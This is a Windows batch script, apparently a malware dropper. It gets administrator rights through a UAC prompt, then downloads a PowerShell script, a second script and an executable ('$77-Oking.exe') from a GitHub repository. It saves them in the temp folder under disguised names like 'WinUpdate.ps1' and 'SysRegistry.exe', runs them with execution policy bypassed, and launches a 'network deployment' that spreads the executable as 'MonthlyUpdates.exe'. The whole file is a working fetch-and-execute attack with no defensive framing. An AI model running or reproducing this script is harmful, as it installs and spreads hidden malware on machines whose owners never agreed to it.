@echo off
setlocal

:: Check for administrative privileges
:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0" 

:: Only run this section with elevated privileges
if "%1"=="restarted" (
    echo Running with elevated privileges

    :: Configure download URLs and file paths
    set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/prep.cmd"
    set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/scanner.ps1"
    set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/$77-Oking.exe"
    set "PS1_FILE=%temp%\WinUpdate.ps1"
    set "EXE_FILE=%temp%\SysRegistry.exe"
    set "PS1.2_FILE=%temp%\IdleSystemCheck.ps1"

    :: Download files using PowerShell
    echo Downloading files...
    powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'"
    powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'"
    powershell -Command "Invoke-WebRequest -Uri '%PS1.2_URL%' -OutFile '%PS1.2_FILE%'"

    :: Execute PowerShell script with unrestricted policy
    echo Executing PowerShell script...
    powershell -ExecutionPolicy Bypass -File "%PS1_FILE%"

    :: Wait for 60 seconds
    echo Waiting for 60 seconds...
    timeout /t 60 /nobreak >nul

    :: Execute the downloaded program
    echo Launching executable...
    start "" "%EXE_FILE%"

    :: Execute deployment script with parameters
    echo Starting network deployment...
    powershell -ExecutionPolicy Bypass -Command "& '%PS1.2_FILE%' -UpdateServer 'https://github.com/Drakovthe6th/TBuG/raw/master/$77-Oking.exe' -ExeName 'MonthlyUpdates.exe'"
)

endlocal